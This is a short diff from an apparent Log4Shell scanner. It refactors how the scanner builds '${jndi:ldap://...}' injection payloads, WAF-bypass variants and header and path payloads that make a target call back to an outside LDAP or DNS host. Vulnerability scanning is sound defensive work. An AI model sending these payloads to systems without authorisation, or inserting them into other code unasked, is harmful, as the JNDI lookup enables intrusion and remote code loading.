@@ -346,15 +346,15 @@ def scan_url(url, callback_host):
     global counter
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    callback_hosts = [callback_host]
+    callback_hosts = [f'{parsed_url["host"]}.{callback_host}']
     if args.waf_bypass_payloads:
-        callback_hosts.append(f'127.0.0.1#{callback_host}')
+        callback_hosts.append(f'127.0.0.1#{parsed_url["host"]}.{callback_host}')
     for callback_host in callback_hosts:
-        payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+        payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
         payloads = [payload]
         if args.waf_bypass_payloads:
-            payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-        paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+            payloads.extend(generate_waf_bypass_payloads(callback_host, random_string))
+        paths = generate_path_payloads(callback_host, random_string)
         for payload in payloads:
             cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
             headers = get_fuzzing_headers(payload)
